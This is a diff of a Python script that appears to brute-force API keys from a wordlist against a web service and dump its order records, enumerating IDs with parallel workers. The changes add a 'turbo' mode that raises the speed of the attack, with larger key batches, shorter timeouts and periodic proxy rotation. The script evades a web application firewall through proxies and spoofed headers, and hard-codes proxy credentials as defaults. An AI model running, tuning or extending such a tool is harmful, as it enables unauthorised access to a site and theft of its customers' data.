@@ -27,7 +27,9 @@ QG_KEY = os.environ.get("QG_AUTHKEY", "C413ED6D")
 QG_PWD = os.environ.get("QG_AUTHPWD", "344F550A6F8B")
 PROXY = ""
 PROXY_AT = 0
-CURL_TIMEOUT = "8"
+CURL_N = 0
+CURL_TIMEOUT = os.environ.get("FFFZZ_TIMEOUT", "5" if os.environ.get("FFFZZ_TURBO") else "8")
+TURBO = bool(os.environ.get("FFFZZ_TURBO"))
 
 
 def log(msg):
@@ -107,12 +109,14 @@ def ensure_proxy():
         fetch_proxy()
 
 
-def curl(url, retry=2):
-    ensure_proxy()
-    proxies = []
-    if PROXY:
-        proxies.append(PROXY)
-    proxies.append(None)  # direct fallback on CN
+def curl(url, retry=1 if TURBO else 2):
+    global CURL_N
+    CURL_N += 1
+    if CURL_N % 80 == 1 or not PROXY:
+        ensure_proxy()
+    proxies = [PROXY] if PROXY else []
+    if not TURBO:
+        proxies.append(None)
     for px in proxies:
         for attempt in range(retry):
             cmd = ["curl", "-sk", f"--max-time", CURL_TIMEOUT, "-b", JAR, "-c", JAR, "-A", UA,
@@ -121,7 +125,7 @@ def curl(url, retry=2):
                 cmd = ["curl", "-x", px, "-sk", f"--max-time", CURL_TIMEOUT, "-b", JAR, "-c", JAR, "-A", UA,
                        "-H", f"Referer: {BASE}", "-H", "X-Requested-With: XMLHttpRequest", url]
             try:
-                r = subprocess.run(cmd, capture_output=True, text=True, timeout=10).stdout or ""
+                r = subprocess.run(cmd, capture_output=True, text=True, timeout=int(CURL_TIMEOUT) + 2).stdout or ""
                 if is_auth_prompt(r) or (r.strip() and not is_waf(r)):
                     return r
                 if is_waf(r) and px:
@@ -197,7 +201,7 @@ def dump_orders(api_key, param="key", max_id=18600, workers=15):
     log(f"DUMP done {len(results)}")
 
 
-def iter_key_batches(wl, start, limit, batch_size=800):
+def iter_key_batches(wl, start, limit, batch_size=4000 if TURBO else 800):
     batch, pos = [], start
     with wl.open(encoding="utf-8", errors="ignore") as f:
         for i, line in enumerate(f):
